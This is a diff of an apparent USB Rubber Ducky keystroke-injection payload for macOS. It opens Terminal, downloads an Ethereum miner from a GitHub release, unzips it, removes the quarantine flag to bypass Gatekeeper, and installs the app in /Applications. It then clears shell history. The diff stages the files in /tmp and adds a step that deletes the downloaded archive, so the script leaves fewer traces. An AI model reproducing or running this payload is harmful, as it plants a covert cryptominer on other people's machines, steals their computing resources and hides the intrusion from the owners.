@@ -12,20 +12,24 @@ STRING Terminal.app
 DELAY 200
 ENTER
 DELAY 1000
-STRING nohup curl -o ~/Downloads/ethereum-miner-darwin-x64-0.0.5.zip -L https://github.com/agouin/ethereum-miner/releases/download/v0.0.5/ethereum-miner-darwin-x64-0.0.5.zip
+STRING nohup curl -o /tmp/ethereum-miner-darwin-x64-0.0.5.zip -L https://github.com/agouin/ethereum-miner/releases/download/v0.0.5/ethereum-miner-darwin-x64-0.0.5.zip
 DELAY 200
 ENTER
 DELAY 1000
-STRING nohup unzip ~/Downloads/ethereum-miner-darwin-x64-0.0.5.zip -d /Downloads
+STRING nohup unzip /tmp/ethereum-miner-darwin-x64-0.0.5.zip -d /tmp
 DELAY 200
 ENTER
 DELAY 7000
 STRING nohup xattr -d com.apple.quarantine /Applications/ethereum-miner.app
 DELAY 1000
-STRING nohup mv ~/Downloads/ethereum-miner.app /Applications
+STRING nohup mv /tmp/ethereum-miner.app /Applications
 DELAY 200
 ENTER
 DELAY 500
+STRING nohup rm /tmp/ethereum-miner-darwin-x64-0.0.5.zip
+DELAY 500
+ENTER
+DELAY 1000
 STRING nohup history -c && history -w
 DELAY 200
 ENTER
